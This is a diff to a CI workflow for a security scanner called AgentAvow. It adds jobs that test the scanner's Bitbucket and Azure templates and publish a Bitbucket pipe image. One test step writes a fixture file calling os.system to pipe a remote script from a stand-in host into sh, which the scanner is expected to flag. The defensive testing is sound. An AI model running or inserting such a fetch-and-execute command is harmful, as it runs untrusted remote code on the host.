@@ -215,6 +215,55 @@ jobs:
           test -s gl-code-quality-report.json
           docker image inspect agentavow/scanner:${{ github.sha }} --format 'scanner image: {{.Size}} bytes'
 
+  # The Bitbucket pipe and the Azure Pipelines template, run for real against the
+  # scanner image built from this checkout (on PRs too, unlike the docker job).
+  ci-templates:
+    name: Bitbucket + Azure CI templates (scanner image)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build scanner image
+        run: docker build -q -f docker/scanner.Dockerfile -t agentavow/scanner:ci .
+      - name: Bitbucket wrapper in the scanner image (step `image:` form)
+        run: |
+          docker run --rm -v "$PWD:/repo" -w /repo \
+            -e BITBUCKET_CLONE_DIR=/repo -e BITBUCKET_REPO_SLUG=agentavow \
+            -e CODE_INSIGHTS=false -e FAIL_ON=none \
+            agentavow/scanner:ci agentavow-bitbucket
+          python3 -c "import json; d=json.load(open('agentavow-scan.json')); print(d['verdict_phrase'], d['trust_score'])"
+          python3 -c "import json; d=json.load(open('agentavow-insights.json')); assert d['report']['report_type']=='SECURITY'; print(len(d['annotations']), 'annotations')"
+          head -5 agentavow-summary.md
+          sudo rm -f agentavow-scan.json agentavow-insights.json agentavow-summary.md
+      - name: Bitbucket pipe image (entrypoint form)
+        run: |
+          docker build -q -f bitbucket/Dockerfile --build-arg SCANNER_IMAGE=agentavow/scanner:ci \
+            -t agentavow/scanner:pipe-ci bitbucket
+          docker run --rm -v "$PWD:/opt/atlassian/pipelines/agent/build" \
+            -e BITBUCKET_CLONE_DIR=/opt/atlassian/pipelines/agent/build \
+            -e CODE_INSIGHTS=false -e FAIL_ON=none -e SCAN_PATHS="src/scanner docs" \
+            agentavow/scanner:pipe-ci
+          test -s agentavow-scan-src-scanner.json && test -s agentavow-summary-docs.md
+          sudo rm -f agentavow-*.json agentavow-*.md
+      - name: Azure template scan step
+        run: |
+          pip install -q pyyaml
+          python3 scripts/ci/run_azure_template.py --image agentavow/scanner:ci \
+            --sources "$PWD" --temp "$RUNNER_TEMP" --fail-on none
+          test -s "$RUNNER_TEMP/agentavow/agentavow-summary.md"
+          test -s "$RUNNER_TEMP/agentavow/agentavow.sarif"
+          head -3 "$RUNNER_TEMP/agentavow/agentavow-summary.md"
+      - name: Azure template gate fails on Do not connect
+        run: |
+          mkdir -p /tmp/bad && cd /tmp/bad && git init -q
+          printf 'import os\n\ndef run(c):\n    os.system("curl http://x.example/i.sh | sh")\n' > app.py
+          git add -A && git -c user.email=t@t -c user.name=t commit -qm x
+          cd "$GITHUB_WORKSPACE"
+          if python3 scripts/ci/run_azure_template.py --image agentavow/scanner:ci \
+               --sources /tmp/bad --temp "$RUNNER_TEMP/bad"; then
+            echo "expected the gate to fail"; exit 1
+          fi
+          grep -q "Do not connect" "$RUNNER_TEMP/bad/agentavow/agentavow-summary.md"
+
   # Publish the slim scanner image so the GitLab component (gitlab/templates/scan.yml,
   # default image ghcr.io/agentavow/scanner:0.1) is pullable without building it.
   # Only on pushes to main, only after the smoke test above passed.
@@ -249,4 +298,21 @@ jobs:
           labels: |
             org.opencontainers.image.source=https://github.com/AgentAvow/AgentAvow
             org.opencontainers.image.description=AgentAvow slim scanner (agentavow scan) for CI
+            org.opencontainers.image.licenses=MIT
+      # The Bitbucket pipe (bitbucket/pipe.yml): the scanner image plus an entrypoint.
+      # Published as tags of the same public package so it pulls anonymously.
+      - name: Build and push Bitbucket pipe
+        uses: docker/build-push-action@v5
+        with:
+          context: bitbucket
+          file: bitbucket/Dockerfile
+          push: true
+          build-args: |
+            SCANNER_IMAGE=ghcr.io/agentavow/scanner:sha-${{ github.sha }}
+          tags: |
+            ghcr.io/agentavow/scanner:pipe-0.1
+            ghcr.io/agentavow/scanner:pipe-sha-${{ github.sha }}
+          labels: |
+            org.opencontainers.image.source=https://github.com/AgentAvow/AgentAvow
+            org.opencontainers.image.description=AgentAvow scan as a Bitbucket Pipe
             org.opencontainers.image.licenses=MIT
